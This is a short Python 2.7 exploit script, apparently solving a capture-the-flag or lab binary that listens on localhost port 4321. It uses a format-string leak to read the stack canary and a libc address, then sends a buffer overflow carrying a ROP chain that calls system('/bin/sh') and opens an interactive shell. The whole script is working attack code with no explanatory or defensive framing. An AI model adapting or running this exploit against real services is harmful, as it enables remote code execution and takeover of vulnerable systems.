#!/usr/bin/python2.7

import socket
import struct
from telnetlib import Telnet

pack = lambda x: struct.pack("<Q", x)

fmt_str = "-%17$lx-%19$lx-"
libc_offset_from_pos_19 = 0x270b3
do_sys_offset = 0x54e50
binsh_offset = 0x1b75aa
pop_rdi_offset = 0x26b72
ret_offset = 0x25679

#pattern = "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"

#offset to canary
junk = "A"*200
#offset to rip from canary
rip = "B"*8

injection = ""

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 4321))
tn = Telnet()
tn.sock = sock

tn.read_until("Entered:")
tn.write(fmt_str+"\n")
leak = tn.read_until("Code:")
canary = int(leak.split("-")[1], 16)
libc_addr = int(leak.split("-")[2], 16)
libc_base = libc_addr - libc_offset_from_pos_19

do_system = libc_base + do_sys_offset
binsh = libc_base + binsh_offset
pop_rdi = libc_base + pop_rdi_offset
ret = libc_base + ret_offset

injection += junk
injection += pack(canary)
injection += rip
injection += pack(ret)
injection += pack(pop_rdi)
injection += pack(binsh)
injection += pack(do_system)

print("[*] Canary: " + hex(canary).strip("L"))
print("[*] Libc Base: " + hex(libc_base))
print("[*] Sending exploit...")
print("[*] Serving up shell...")

tn.write(injection + "\n")
tn.read_until(".")
tn.interact()

#sock.recv(1024) #this will keep the program from ending so we can debug the process